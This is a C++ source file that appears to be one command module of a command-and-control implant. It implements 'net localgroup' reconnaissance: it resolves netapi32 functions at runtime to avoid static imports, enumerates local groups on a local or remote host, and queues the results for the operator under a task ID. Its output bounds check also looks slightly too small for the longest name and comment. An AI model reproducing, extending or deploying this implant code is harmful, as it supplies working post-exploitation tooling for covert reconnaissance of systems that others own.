#include <common.h>
#include <commands.h>
#include <package.h>
#include <parser.h>
#include <config.h>
#include <strings.h>

#ifdef INCLUDE_CMD_NET_LOCALGROUP

using namespace stardust;
using namespace starburst;

typedef struct _LOCALGROUP_INFO_1 {
    LPWSTR lgrpi1_name;
    LPWSTR lgrpi1_comment;
} LOCALGROUP_INFO_1;

typedef DWORD (WINAPI *fn_NetLocalGroupEnum)( LPCWSTR, DWORD, LPBYTE*, DWORD, LPDWORD, LPDWORD, PDWORD_PTR );
typedef DWORD (WINAPI *fn_NetApiBufferFree)( LPVOID );

auto declfn starburst::cmd_net_localgroup(
    _Inout_ instance& inst,
    _In_    char*     task_uuid,
    _In_    Parser*   params
) -> void {
    auto h_netapi = reinterpret_cast<HMODULE>( inst.kernel32.LoadLibraryA(
        symbol<LPCSTR>( "netapi32.dll" ) ) );
    if ( !h_netapi ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "LoadLibrary netapi32 failed" ) ) );
        return;
    }

    auto pNetLocalGroupEnum = reinterpret_cast<fn_NetLocalGroupEnum>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetLocalGroupEnum" ) ) );
    auto pNetApiBufferFree = reinterpret_cast<fn_NetApiBufferFree>(
        inst.kernel32.GetProcAddress( h_netapi,
            symbol<LPCSTR>( "NetApiBufferFree" ) ) );
    if ( !pNetLocalGroupEnum || !pNetApiBufferFree ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "API resolution failed" ) ) );
        return;
    }

    uint32_t host_len = 0;
    auto host_str = parser_string( params, &host_len );

    wchar_t w_host[256] = { 0 };
    wchar_t* p_host = nullptr;
    if ( host_str && host_len > 0 ) {
        char host_buf[256] = { 0 };
        memory::copy( host_buf, host_str, host_len < 255 ? host_len : 255 );
        inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host_buf, -1, w_host, 256 );
        p_host = w_host;
    }

    LPBYTE buf = nullptr;
    DWORD entries_read = 0, total_entries = 0;
    DWORD_PTR resume = 0;

    DWORD status = pNetLocalGroupEnum(
        p_host, 1, &buf, 0xFFFFFFFF,
        &entries_read, &total_entries, &resume );

    if ( status != 0 && status != 234 ) {
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "NetLocalGroupEnum failed" ) ) );
        return;
    }

    uint32_t out_cap = 8192;
    auto output = static_cast<char*>( inst.heap_alloc( out_cap ) );
    if ( !output ) {
        pNetApiBufferFree( buf );
        queue_response( inst, task_uuid, RESPONSE_ERROR,
            symbol<char*>( const_cast<char*>( "alloc failed" ) ) );
        return;
    }
    uint32_t off = 0;

    auto groups = reinterpret_cast<LOCALGROUP_INFO_1*>( buf );
    for ( DWORD i = 0; i < entries_read && off + 520 < out_cap; i++ ) {
        char name[260] = { 0 };
        inst.kernel32.WideCharToMultiByte( CP_ACP, 0, groups[i].lgrpi1_name, -1, name, 260, nullptr, nullptr );
        uint32_t nlen = str_len( name );
        memory::copy( output + off, name, nlen );
        off += nlen;

        if ( groups[i].lgrpi1_comment ) {
            char comment[260] = { 0 };
            inst.kernel32.WideCharToMultiByte( CP_ACP, 0, groups[i].lgrpi1_comment, -1, comment, 260, nullptr, nullptr );
            uint32_t clen = str_len( comment );
            if ( clen > 0 ) {
                for ( uint32_t pad = nlen; pad < 30; pad++ ) output[off++] = ' ';
                memory::copy( output + off, comment, clen );
                off += clen;
            }
        }
        output[off++] = '\n';
    }

    output[off] = '\0';
    pNetApiBufferFree( buf );
    queue_response( inst, task_uuid, RESPONSE_SUCCESS, output );
    inst.heap_free( output );
}

#endif
